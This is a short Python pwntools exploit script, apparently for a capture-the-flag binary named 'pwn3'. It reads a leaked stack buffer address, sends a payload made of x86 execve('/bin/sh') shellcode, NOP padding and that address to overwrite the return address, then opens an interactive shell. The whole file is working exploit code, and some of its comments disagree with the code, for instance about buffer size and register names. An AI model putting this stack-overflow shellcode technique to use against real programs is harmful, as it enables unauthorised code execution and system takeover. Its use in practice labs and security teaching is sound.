#!/usr/bin/python3
from pwn import *
# Connect to target process
target = process('./pwn3')
# 64 characters are read into a 32 bit buffer
greeting = target.recvline().decode('utf-8').strip('\n')
print(greeting)
# address of buffer we are writing to
buf = int(greeting[-12:-1], 16)
log.info("Buffer at " + str(buf))
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
# Address after 302nd character overwrites rsp
# We overwrite it with the beginning of the buffer where
# the shellcode is so it executes
padding = b"\x90"*(302-23)
payload = shellcode + padding + p32(buf)
print(payload)
# log.info("And we have a shell!")
# Send the payload
target.sendline(payload)
# Drop to an interactive shell so we can interact with our shell
target.interactive()

